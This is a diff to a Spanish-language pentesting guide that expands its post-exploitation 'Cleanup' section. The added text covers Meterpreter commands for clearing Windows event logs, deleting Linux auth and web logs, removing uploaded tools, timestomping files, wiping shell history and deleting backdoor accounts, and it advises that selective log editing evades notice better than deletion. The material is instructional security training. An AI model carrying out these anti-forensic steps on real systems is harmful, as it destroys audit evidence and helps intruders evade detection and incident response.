+- 📊 **Tamaño**: Archivos grandes pueden generar alertas de red
+- ⏱️ **Tiempo**: Transferencias largas aumentan riesgo de detección
 
 #### Cleanup (Limpieza)
 
-**Propósito**: Eliminar rastros de la actividad para mantener el acceso y evitar detección
+**Propósito**: Eliminar rastros de actividad para mantener acceso y evitar detección
 
 **Acciones de limpieza**:
-- 🗑️ Borrar logs de sistema
-- 🔄 Restaurar archivos modificados
-- ❌ Eliminar herramientas subidas
-- 🕐 Ajustar timestamps
-- 🧹 Limpiar historial de comandos
 
-**Ejemplo**:
+1. **Borrar logs del sistema**:
 ```bash
-# En Meterpreter
+# Limpiar Event Logs (Windows)
 meterpreter > clearev
-[*] Clearing event logs...
+[*] Wiping 12345 records from Application...
+[*] Wiping 23456 records from System...
+[*] Wiping 34567 records from Security...
+
+# Logs específicos (Linux)
+meterpreter > shell
+rm /var/log/auth.log
+rm /var/log/apache2/access.log
 ```
+
+2. **Eliminar archivos subidos**:
+```bash
+# Listar archivos subidos durante la sesión
+meterpreter > ls C:\\Windows\\Temp\\
+
+# Eliminar herramientas
+meterpreter > rm C:\\Windows\\Temp\\mimikatz.exe
+meterpreter > rm C:\\Windows\\Temp\\exploit.dll
+```
+
+3. **Ajustar timestamps (timestomping)**:
+```bash
+# Modificar fechas de archivos para evitar detección
+meterpreter > timestomp C:\\Windows\\System32\\evil.exe -v
+meterpreter > timestomp C:\\Windows\\System32\\evil.exe -m "01/01/2020 12:00:00"
+```
+
+4. **Limpiar historial de comandos**:
+```bash
+# PowerShell history (Windows)
+meterpreter > rm C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
+
+# Bash history (Linux)
+rm ~/.bash_history
+history -c
+```
+
+5. **Cerrar servicios/procesos creados**:
+```bash
+# Detener servicios que hayamos creado
+meterpreter > execute -f cmd.exe -a "/c sc stop malicious_service" -H
+
+# Matar procesos
+meterpreter > kill <PID>
+```
+
+6. **Eliminar cuentas creadas**:
+```bash
+# Si creamos cuentas de usuario, eliminarlas
+meterpreter > execute -f cmd.exe -a "/c net user backdoor /delete" -H
+```
+
+**Niveles de limpieza**:
+
+| Nivel | Descripción | Cuándo usar |
+|-------|-------------|-------------|
+| **Mínima** | Solo borrar archivos críticos | Evaluaciones donde se requiere evidencia |
+| **Moderada** | Borrar archivos y limpiar logs principales | Pentesting estándar |
+| **Completa** | Borrar todo rastro, incluir timestomping | Red Team, simulaciones de APT |
+
+**⚠️ Advertencia importante**:
+
+> La limpieza debe ser **cuidadosa** - borrar logs de forma obvia puede ser más sospechoso que dejarlos. En algunos casos, modificar logs selectivamente es mejor que borrarlos completamente.
 
 ---
 
